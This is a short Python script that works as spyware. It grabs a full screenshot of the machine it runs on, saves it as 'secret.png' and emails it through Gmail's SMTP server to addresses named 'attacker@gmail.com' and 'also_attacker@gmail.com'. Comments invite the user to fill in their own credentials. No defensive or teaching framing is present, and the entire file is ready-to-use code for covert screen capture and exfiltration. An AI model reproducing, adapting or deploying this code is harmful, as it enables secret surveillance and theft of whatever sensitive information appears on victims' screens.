import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from PIL import ImageGrab

## you'll need to edit this and input your own email/password/smtp server

# SMTP settings
sender = "attacker@gmail.com" # replace
receiver = "also_attacker@gmail.com" # replace 
password = "your_password" # replace 
smtp_server = "smtp.gmail.com" # replace 
smtp_port = 587

# screenshot get
screenshot = ImageGrab.grab()
screenshot.save("secret.png", "PNG")


# Init email
msg = MIMEMultipart()
msg["From"] = sender
msg["To"] = receiver
msg["Subject"] = "Spot-em-got-em"

# Attaching screenshot to message
with open("secret.png", "rb") as f:
    img_data = f.read()
    image = MIMEImage(img_data, name="secret.png")
    msg.attach(image)

# Send it!
with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.starttls()
    server.login(sender, password)
    server.send_message(msg)
    print("Screenshot sent!")
